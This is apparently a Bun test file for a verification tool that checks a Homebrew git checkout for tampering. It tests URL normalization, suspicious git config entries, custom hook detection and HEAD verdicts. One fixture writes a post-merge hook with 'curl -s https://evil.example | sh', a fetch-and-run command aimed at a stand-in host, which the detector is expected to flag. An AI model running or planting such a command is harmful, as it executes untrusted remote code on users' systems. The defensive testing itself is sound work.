import { describe, expect, test } from "bun:test"
import { mkdirSync, rmSync, writeFileSync } from "node:fs"

import { classifyHead, customHooks, normalizeRemote, suspiciousConfig } from "../src/verify"

describe("verify helpers", () => {
  test("remote URLs normalize to one official form", () => {
    for (const url of [
      "https://github.com/Homebrew/brew",
      "https://github.com/Homebrew/brew.git",
      "git@github.com:Homebrew/brew.git",
      "HTTPS://GitHub.com/homebrew/brew/"
    ])
      expect(normalizeRemote(url)).toBe("https://github.com/homebrew/brew")
    expect(normalizeRemote("https://mirrors.tuna.tsinghua.edu.cn/git/homebrew/brew.git")).not.toBe(
      "https://github.com/homebrew/brew"
    )
  })
  test("Homebrew's own fsmonitor setting is not suspicious, redirects and hooks paths are", () => {
    const lines = [
      "file:.git/config\tcore.fsmonitor false",
      "file:/Users/me/.gitconfig\turl.https://mirror.example/.insteadof https://github.com/",
      "file:.git/config\tcore.hookspath /tmp/hooks"
    ].join("\n")
    expect(suspiciousConfig(lines)).toEqual([lines.split("\n")[1], lines.split("\n")[2]])
    expect(suspiciousConfig("")).toEqual([])
  })
  test("git-lfs hooks and samples are ignored, other hooks are reported", () => {
    const dir = `${import.meta.dir}/../node_modules/.cache/verify-hooks-${process.pid}`
    mkdirSync(dir, { recursive: true })
    try {
      writeFileSync(
        `${dir}/post-checkout`,
        "#!/bin/sh\ncommand -v git-lfs >/dev/null 2>&1 || exit 2\ngit lfs post-checkout\n"
      )
      writeFileSync(`${dir}/pre-commit.sample`, "#!/bin/sh\n")
      writeFileSync(`${dir}/post-merge`, "#!/bin/sh\ncurl -s https://evil.example | sh\n")
      expect(customHooks(dir)).toEqual(["post-merge"])
      expect(customHooks(`${dir}/none`)).toEqual([])
    } finally {
      rmSync(dir, { recursive: true, force: true })
    }
  })
  test("HEAD verdicts", () => {
    const head = "a".repeat(40)
    expect(classifyHead({ head, tag: "7.0.12", remoteTag: head, online: true }).level).toBe("ok")
    expect(classifyHead({ head, tag: "7.0.12", remoteTag: "b".repeat(40), online: true }).level).toBe("fail")
    expect(classifyHead({ head, remoteHead: head, branch: "main", online: true }).level).toBe("ok")
    expect(classifyHead({ head, remoteHead: "b".repeat(40), branch: "main", localAhead: 0, online: true }).level).toBe(
      "warn"
    )
    expect(classifyHead({ head, remoteHead: "b".repeat(40), branch: "main", localAhead: 3, online: true }).level).toBe(
      "fail"
    )
    expect(classifyHead({ head, remoteHead: "b".repeat(40), branch: "main", online: true }).level).toBe("fail")
    expect(classifyHead({ head, tag: "7.0.12", online: false }).level).toBe("warn")
  })
})
